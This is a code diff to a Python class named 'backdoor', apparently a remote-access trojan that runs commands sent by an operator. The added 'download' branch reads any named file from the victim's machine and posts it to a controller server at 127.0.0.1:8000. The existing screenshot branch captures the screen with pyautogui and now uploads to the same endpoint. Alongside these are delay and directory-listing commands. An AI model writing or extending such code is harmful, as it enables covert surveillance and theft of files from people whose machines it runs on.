@@ -89,15 +89,24 @@ class backdoor:
                 delay_command = command.split("(")
                 time_to_delay = delay_command[1].replace(")", "")
                 time.sleep(float(time_to_delay))
+            elif command.startswith("download"):
+                download_command = command.split("(")
+                file_to_download = download_command[1].replace(")", "")
+                file_to_download = file_to_download.replace('"','')
+                file_to_download = file_to_download.replace("'","")
+                try:
+                    file = open(file_to_download, "rb")
+                    upload_file = {"file": file}
+                    r = requests.post("http://127.0.0.1:8000/files/", files = upload_file)
+                    output += "Downloaded " + str(upload_file)
+                except FileNotFoundError:
+                    output += file_to_download + " does not exist"
             elif command.startswith("screenshot"):
-                delay_command = command.split("(")
-                time_to_delay = delay_command[1].replace(")", "")
                 myScreenshot = pyautogui.screenshot()
                 myScreenshot.save('screenshot.png')
                 sample_file = open("screenshot.png", "rb")
                 upload_file = {"file": sample_file}
-                r = requests.post("http://127.0.0.1:8000/screenshot/", files = upload_file)
-                os.remove("screenshot.png")
+                r = requests.post("http://127.0.0.1:8000/files/", files = upload_file)
             elif command.startswith("ls"):
                 output = ""
                 for i in os.listdir():
